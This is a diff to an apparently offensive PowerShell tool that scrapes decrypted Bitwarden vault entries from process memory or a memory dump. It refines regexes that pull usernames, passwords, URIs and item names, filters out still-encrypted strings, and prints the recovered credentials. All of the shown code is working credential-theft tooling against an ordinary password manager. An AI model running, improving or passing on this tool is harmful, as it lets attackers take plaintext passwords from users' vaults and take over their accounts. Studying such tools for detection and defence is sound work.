@@ -815,8 +815,13 @@ function Invoke-BWDump {
 
     [BW.Mem]::Close($hProc)
 
-    # Deduplicate and display results
-    $unique = $credentials | Sort-Object { "$($_.URL)$($_.Username)$($_.Password)" } -Unique
+    # Filter out EncStrings, garbage, and deduplicate
+    $encStrRe = '^\d\.[A-Za-z0-9+/=\\]{10,}'
+    $filtered = $credentials | Where-Object {
+        $_.Username -notmatch $encStrRe -and $_.Password -notmatch $encStrRe -and
+        $_.Password.Length -lt 300 -and $_.Username.Length -lt 200
+    }
+    $unique = $filtered | Sort-Object { "$($_.Username)|$($_.Password)" } -Unique
     Write-Status "EXTRACTED CREDENTIALS" "header"
     if ($unique.Count -gt 0) {
         $i = 0
@@ -824,7 +829,7 @@ function Invoke-BWDump {
             $i++
             Write-Host ""
             Write-Host "  [$i] " -NoNewline -ForegroundColor Green
-            if ($cred.Name) { Write-Host "Name: $($cred.Name)" -ForegroundColor White }
+            if ($cred.Name) { Write-Host "$($cred.Name) " -ForegroundColor White -NoNewline; Write-Host "(Memory)" -ForegroundColor DarkGray } else { Write-Host "" }
             if ($cred.URL) { Write-Host "      URL:  $($cred.URL)" -ForegroundColor Gray }
             if ($cred.Username) { Write-Host "      User: $($cred.Username)" -ForegroundColor Cyan }
             if ($cred.Password) { Write-Host "      Pass: $($cred.Password)" -ForegroundColor Yellow }
@@ -841,32 +846,49 @@ function Invoke-BWDump {
 function Find-CredentialPatterns {
     param([string]$Text, [ref]$Credentials)
 
-    # JSON vault item patterns (decrypted in memory)
-    $jsonPattern = '(?s)\{[^{}]*"username"\s*:\s*"([^"]+)"[^{}]*"password"\s*:\s*"([^"]+)"[^{}]*\}'
+    # Bitwarden cipher JSON in memory: extract username/password/uri from decrypted vault items
+    $jsonPattern = '"username"\s*:\s*"([^"]{1,200})"\s*,\s*"password"\s*:\s*"([^"]{1,500})"'
     $matches2 = [regex]::Matches($Text, $jsonPattern, [System.Text.RegularExpressions.RegexOptions]::IgnoreCase)
     foreach ($m in $matches2) {
         $user = $m.Groups[1].Value
         $pass = $m.Groups[2].Value
-        if ($pass.Length -gt 1 -and $pass.Length -lt 500 -and $user.Length -lt 200) {
-            $urlMatch = [regex]::Match($m.Value, '"uri"\s*:\s*"([^"]+)"', [System.Text.RegularExpressions.RegexOptions]::IgnoreCase)
-            $nameMatch = [regex]::Match($m.Value, '"name"\s*:\s*"([^"]+)"', [System.Text.RegularExpressions.RegexOptions]::IgnoreCase)
+        # Skip encrypted EncStrings (including JSON-escaped unicode like + for +)
+        if ($user -match '^\d\.[A-Za-z0-9+/=\\]{10,}' -or $pass -match '^\d\.[A-Za-z0-9+/=\\]{10,}') { continue }
+        if ($pass.Length -gt 1 -and $user.Length -gt 1) {
+            # Search surrounding context for uri and name (within 4000 chars before and 500 after)
+            $ctxStart = [Math]::Max(0, $m.Index - 4000)
+            $ctxEnd = [Math]::Min($Text.Length, $m.Index + $m.Length + 500)
+            $context = $Text.Substring($ctxStart, $ctxEnd - $ctxStart)
+            $urlMatch = [regex]::Match($context, '"uri"\s*:\s*"([^"]{5,500})"', [System.Text.RegularExpressions.RegexOptions]::IgnoreCase)
+            $nameMatch = [regex]::Match($context, '"name"\s*:\s*"([^"]{1,100})"', [System.Text.RegularExpressions.RegexOptions]::IgnoreCase)
+            $nameVal = ""
+            if ($nameMatch.Success) {
+                $n = $nameMatch.Groups[1].Value
+                if ($n -notmatch '^\d\.[A-Za-z0-9+/=]') { $nameVal = $n }
+            }
+            $urlVal = ""
+            if ($urlMatch.Success) { $urlVal = $urlMatch.Groups[1].Value }
+            elseif ($nameVal -match '^\w[\w.-]+\.\w{2,}$') { $urlVal = "https://$nameVal" }
             $Credentials.Value += [PSCustomObject]@{
-                Name     = if ($nameMatch.Success) { $nameMatch.Groups[1].Value } else { "" }
-                URL      = if ($urlMatch.Success) { $urlMatch.Groups[1].Value } else { "" }
+                Name     = $nameVal
+                URL      = $urlVal
                 Username = $user
                 Password = $pass
             }
         }
     }
 
-    # URL + credential proximity pattern (ASCII printable only to avoid memory garbage)
-    $urlCredsPattern = '(https?://[\x20-\x7E]{5,100})\s{0,50}([\w.+-]+@[\w.-]+\.\w{2,})\s{0,50}([\x20-\x7E]{4,100})'
+    # URL + credential proximity: restrict URL to valid URL chars (stop at JSON delimiters)
+    $urlCredsPattern = '(https?://[A-Za-z0-9_.~:/?#\[\]@!$&''()*+,;=%-]{5,300})\s{1,50}([\w.+-]+@[\w.-]+\.\w{2,})\s{1,50}([^\s"''<>{}\[\]]{4,100})'
     $matches3 = [regex]::Matches($Text, $urlCredsPattern)
     foreach ($m in $matches3) {
-        $url = $m.Groups[1].Value -replace '[\x00-\x1F\x7F-\xFF]+', ''
+        $url = $m.Groups[1].Value.TrimEnd('.,;')
+        $pass = $m.Groups[3].Value.TrimEnd('.,;')
+        # Skip if this looks like JSON structure (already handled by JSON pattern above)
+        if ($pass -match '^[,{}\[\]":]' -or $url -match '"[,}:\[]') { continue }
         $Credentials.Value += [PSCustomObject]@{
-            Name = ""; URL = $url.Trim()
-            Username = $m.Groups[2].Value.Trim(); Password = $m.Groups[3].Value.Trim()
+            Name = ""; URL = $url
+            Username = $m.Groups[2].Value.Trim(); Password = $pass
         }
     }
 }
@@ -904,7 +926,12 @@ function Invoke-BWParseDump {
     }
     $stream.Close()
 
-    $unique = $credentials | Sort-Object { "$($_.URL)$($_.Username)$($_.Password)" } -Unique
+    $encStrRe = '^\d\.[A-Za-z0-9+/=\\]{10,}'
+    $filtered = $credentials | Where-Object {
+        $_.Username -notmatch $encStrRe -and $_.Password -notmatch $encStrRe -and
+        $_.Password.Length -lt 300 -and $_.Username.Length -lt 200
+    }
+    $unique = $filtered | Sort-Object { "$($_.Username)|$($_.Password)" } -Unique
     Write-Status "EXTRACTED CREDENTIALS" "header"
     if ($unique.Count -gt 0) {
         $i = 0
@@ -912,7 +939,7 @@ function Invoke-BWParseDump {
             $i++
             Write-Host ""
             Write-Host "  [$i] " -NoNewline -ForegroundColor Green
-            if ($cred.Name) { Write-Host "Name: $($cred.Name)" -ForegroundColor White }
+            if ($cred.Name) { Write-Host "$($cred.Name) " -ForegroundColor White -NoNewline; Write-Host "(Memory)" -ForegroundColor DarkGray } else { Write-Host "" }
             if ($cred.URL) { Write-Host "      URL:  $($cred.URL)" -ForegroundColor Gray }
             if ($cred.Username) { Write-Host "      User: $($cred.Username)" -ForegroundColor Cyan }
             if ($cred.Password) { Write-Host "      Pass: $($cred.Password)" -ForegroundColor Yellow }
